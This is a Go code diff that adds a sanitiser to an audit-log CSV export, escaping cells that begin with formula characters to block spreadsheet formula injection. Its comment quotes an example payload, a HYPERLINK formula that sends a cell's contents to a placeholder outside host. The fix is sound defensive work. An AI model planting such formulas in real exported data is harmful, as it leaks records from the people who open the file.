@@ -270,6 +270,30 @@ func (s *Server) listAudit(response http.ResponseWriter, request *http.Request) 
 // exportAudit writes the filtered result as CSV. An audit extract is normally
 // wanted as evidence outside the console, and asking an operator to copy rows
 // out of a browser is how evidence gets transcribed wrongly.
+// spreadsheetSafe stops a recorded value from becoming a formula.
+//
+// This file is served as an attachment for someone to open in a spreadsheet,
+// and Excel and LibreOffice both execute a cell whose text begins with =, +, -
+// or @. Two of the columns carry text a user chose: the reason typed on every
+// change, and the actor name, which for a federated account is whatever the
+// identity provider put in the claim.
+//
+// So a reason of =HYPERLINK("http://elsewhere/"&A1,"open") runs when an
+// auditor opens the export - someone with more access than whoever wrote it,
+// reading a file this product told them to download. A leading apostrophe is
+// the convention for this: the spreadsheet shows the original text and does not
+// evaluate it.
+func spreadsheetSafe(value string) string {
+	if value == "" {
+		return value
+	}
+	switch value[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + value
+	}
+	return value
+}
+
 func (s *Server) exportAudit(response http.ResponseWriter, request *http.Request) {
 	filter, err := parseAuditFilter(request)
 	if err != nil {
@@ -305,9 +329,10 @@ func (s *Server) exportAudit(response http.ResponseWriter, request *http.Request
 			occurred = fmt.Sprint(value)
 		}
 		_ = writer.Write([]string{
-			occurred, record.ActorType, record.ActorName, record.Action,
-			record.Result, record.ResourceType, optionalText(record.ResourceID),
-			record.SourceIP, record.RequestID, record.Reason,
+			occurred, record.ActorType, spreadsheetSafe(record.ActorName),
+			record.Action, record.Result, record.ResourceType,
+			optionalText(record.ResourceID),
+			record.SourceIP, record.RequestID, spreadsheetSafe(record.Reason),
 		})
 	}
 	writer.Flush()
